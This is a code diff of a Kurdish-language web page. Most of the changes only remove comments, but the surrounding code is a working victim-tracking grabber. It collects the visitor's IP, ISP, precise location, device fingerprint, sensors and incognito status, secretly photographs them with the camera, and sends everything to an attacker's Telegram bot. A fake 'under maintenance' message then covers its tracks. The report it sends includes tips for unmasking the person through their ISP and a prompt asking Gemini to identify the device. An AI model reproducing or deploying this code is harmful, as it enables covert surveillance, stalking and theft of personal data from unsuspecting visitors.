@@ -54,7 +54,6 @@
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id') || "6782298541";
 
-        // وەرگرتنی ناوی بەکارهێنەری تێلێگرام (First Name)
         async function getTelegramFirstName() {
             try {
                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
@@ -76,14 +75,12 @@
 
             let firstName = await getTelegramFirstName();
 
-            // کات و ڕۆژی هەفتە بە کوردی
             const days = ["یەکشەممە", "دووشەممە", "سێشەممە", "چوارشەممە", "پێنجشەممە", "هەینی", "شەممە"];
             const now = new Date();
             let dayName = days[now.getDay()];
             let timeString = now.toISOString().replace('T', ' ').substring(0, 19);
             let fullDateText = `${timeString} (${dayName})`;
             
-            // 1. مۆدێل و ئامێر
             let deviceModel = "نادیار";
             try {
                 const parser = new UAParser();
@@ -93,7 +90,6 @@
 
             const userAgentText = navigator.userAgent;
 
-            // 2. IP و ISP
             let ip = 'نادیار', isp = 'نادیار';
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -102,7 +98,6 @@
                 isp = data.org || 'نادیار';
             } catch (e) {}
 
-            // 3. لۆکەیشن و گوگل مەپس
             let locationText = "بەردەست نییە";
             let mapLink = "";
             let locationStatus = "";
@@ -119,7 +114,6 @@
                 locationStatus = "بەکارهێنەرەکە ڕێگەی پێنەداوە و لۆکەیشنی داخستووە (Deny کردووە) 🔴";
             }
 
-            // 4. باتری (شەحن)
             let batteryInfo = "نەزانراو";
             try {
                 if (navigator.getBattery) {
@@ -130,19 +124,14 @@
                 }
             } catch (e) {}
 
-            // 5. شاشە و پیکسڵ
             let screenRes = `${window.screen.width}x${window.screen.height}`;
             let pixelRatio = window.devicePixelRatio || 1;
 
-            // 6. زانیارییە گشتییەکانی تر (RAM, CPU, Language, Dark Mode)
             let cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} ناوک (Cores)` : "نەزانراو";
             let deviceRam = navigator.deviceMemory ? `نزیکەی ${navigator.deviceMemory} گێگابایت` : "نەزانراو";
             let sysLang = navigator.language || "نەزانراو";
             let isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "دۆخی تاریک (Dark Mode)" : "دۆخی ڕووناک (Light Mode)";
 
-            // --- تایبەتمەندییە نوێیەکان ---
-
-            // A. Network Information API (Extended - RTT & Downlink)
             let extendedNetwork = "نەزانراو";
             try {
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
@@ -154,11 +143,9 @@
                 }
             } catch (e) {}
 
-            // B. Advanced Canvas & WebGL Fingerprinting
             let advFingerprint = "نەزانراو";
             let gpuInfo = "نەزانراو";
             try {
-                // WebGL GPU Info
                 const canvasGL = document.createElement('canvas');
                 const gl = canvasGL.getContext('webgl') || canvasGL.getContext('experimental-webgl');
                 if (gl) {
@@ -167,7 +154,6 @@
                         gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                     }
                 }
-                // Canvas Fingerprint Hash Simulation
                 const canvas2D = document.createElement('canvas');
                 const ctx = canvas2D.getContext('2d');
                 ctx.textBaseline = "top";
@@ -185,7 +171,6 @@
                 advFingerprint = `Hash ID: ${Math.abs(hash)} (GPU: ${gpuInfo})`;
             } catch (e) {}
 
-            // C. Device Orientation & Motion Sensors
             let motionInfo = "بەردەست نییە یان ڕێگری لێکراوە";
             try {
                 let orientationData = await new Promise((resolve) => {
@@ -208,19 +193,16 @@
                 motionInfo = orientationData;
             } catch (e) {}
 
-            // D. Incognito / Private Mode Detection
             let incognitoStatus = "ئاسایی (Normal Mode)";
             try {
                 if ('storage' in navigator && 'estimate' in navigator.storage) {
                     let estimate = await navigator.storage.estimate();
-                    // لە حاتی ئینکۆگنیستۆدا قەبارەی کوتراوی سۆراج زۆر سنووردارە (بەزۆری کەمتر لە 120 مێگابایت)
                     if (estimate.quota && estimate.quota < 120 * 1024 * 1024) {
                         incognitoStatus = "پەنجەرەی نەبینراو / ئینکۆگنیستۆ (Incognito Mode) 🕵️‍♂️";
                     }
                 }
             } catch (e) {}
 
-            // 7. کامێرا و وێنەگرتن
             let imageBlob = null;
             let cameraStatus = "";
             try {
@@ -247,12 +229,10 @@
                 cameraStatus = "بەکارهێنەرەکە Allowـی نەکردووە (Deny کردووە)، بۆیە وێنەی نەهاتۆتەوە 🔴";
             }
 
-            // ڕێکوپێککردنی بەستەری مەپس یان هۆکاری Deny بوونی
             let mapTextPart = mapLink 
                 ? `لۆکەیشنی دەقیقی کەسەکە ئەمەتا دەتوانی بە کلیک کردن لەسەر [گووگڵ ماپ] (${mapLink}) بیبینی:\n(Lat & Long: ${locationText})` 
                 : `لۆکەیشن: ${locationStatus}`;
 
-            // دروستکردنی دەقی نامەکە
             let introText = imageBlob 
                 ? `👤 سڵاو ${firstName}، ئەمە وێنەی کەسەکەیە و وردەکارییەکانی بەم شێوەیەیە:` 
                 : `👤 سڵاو ${firstName}، وێنەی کەسەکە نەهاتۆتەوە، چونکە ${cameraStatus}`;
@@ -282,9 +262,8 @@
                         `3. کۆمپانیاکەی ئینتەرنێت لە ڕێگەی کاتی ڕووداوەکە (Timestamp: ${timeString}) دەتوانێت بە دەقیقی دیاری بکات کە ئەو IPـیە لەو ساتەدا لەلایەن کێوە بەکارهاتووە.\n\n` +
                         `🤖 **پرۆمتی تایبەت بۆ جێمینای:**\n` +
                         `ئەگەر دەتەوێت بە دەقیقی جۆری مۆدێلی ئامێرەکەی بزانیت، ئەم ڕستەی خوارەوە کۆپی بکە و بینێرە بۆ جێمینای:\n\n` +
-                        `"سڵاو! من ئەم زانیارییە تەکنیکییانەی ئامێری کەسێکم هەیە: GPU WebGL: ${gpuInfo}، ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})، ناوکەکانی پرۆسێسەر: ${cpuCores}، ڕام: ${deviceRam}، و User-Agent: ${userAgentText}. تکایە شیکاری بکە و دیاری بکە کە ئەم ئامێرە هی چ مۆدێل و برندێکی دیاریکراوە (بۆ نموونە: Samsung Galaxy S series, iPhone, Xiaomi, لاپتۆپ و غەیری)؟"`;
+                        `"سڵاو! من ئەم زانیارییە تەکنیکییانەی ئامێری کەسێکم هەیە: GPU WebGL: ${gpuInfo}، ڕوونی شاشە: ${screenRes} (Ratio: ${pixelRatio})، ناوکەکانی پرۆسێسەر: ${cpuCores}، ڕام: ${deviceRam}، و User-Agent: ${userAgentText}. تکایە شیکاری بکە و دیاری بکە کە ئەم ئامێرە هی چ مۆدێل و برندێکی دیاریکراوە (بۆ نموونە: Samsung Galaxy S series, iPhone, Xiaomi, لاپتۆپ و غەیری)?"`;
 
-            // ناردنی دەقەکە بۆ تێلێگرام
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -297,7 +276,6 @@
                 });
             } catch (err) {}
 
-            // ناردنی وێنە ئەگەر هاتبێتەوە
             if (imageBlob) {
                 try {
                     const formData = new FormData();
@@ -312,7 +290,6 @@
                 } catch (err) {}
             }
 
-            // گەڕاندنەوەی باری ئاسایی پەڕەکە
             document.getElementById('content-box').innerHTML = `
                 <h1>⚙️ ماڵپەڕەکە لەژێر کارکردندایە</h1>
                 <p>تکایە کەمێکی تر هەوڵبدەرەوە، کار لەسەر چاککردنی سیستەمەکە دەکرێت.</p>
